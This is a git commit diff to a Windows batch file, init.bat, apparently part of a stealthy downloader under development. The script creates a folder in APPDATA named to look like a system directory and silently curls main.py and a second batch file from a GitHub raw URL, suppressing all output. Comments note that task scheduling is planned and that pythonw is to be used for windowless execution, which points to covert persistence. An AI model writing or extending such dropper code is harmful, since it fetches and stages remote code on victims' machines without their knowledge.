48a0c3134201fb3ce112c607b70d36aad3d98eb0
faruqer <osamafaruq4444@gmail.com>
2024-10-03 20:36:10 +0300

    checking the file

--- init.bat
+++ init.bat
@@ -1,11 +1,12 @@
 @REM TODO: Scheduling the task will done in another phase
 
 @echo off
-mkdir %APPDATA%\.system_arcx64
-mkdir %APPDATA%\.system_arcx64\files
+set folderPath=%APPDATA%\.system_arcx64
+
+if not exist "%folderPath%" (
+    mkdir %folderPath%
+)
 
 @REM Download the files from  stable and secure source
-curl https://raw.githubusercontent.com/testrepo/cheki/refs/heads/main/main.py -o %APPDATA%\.system_arcx64\main.py > NUL 2>&1
-curl https://raw.githubusercontent.com/testrepo/cheki/refs/heads/main/py_down.bat -o %APPDATA%\.system_arcx64\py_donw.bat  > NUL 2>&1
-
-@REM use pythonw instade
+curl https://raw.githubusercontent.com/testrepo/cheki/refs/heads/main/main.py -o %folderPath%\main.py > NUL 2>&1
+curl https://raw.githubusercontent.com/testrepo/cheki/refs/heads/main/py_down.bat -o %folderPath%\py_donw.bat  > NUL 2>&1
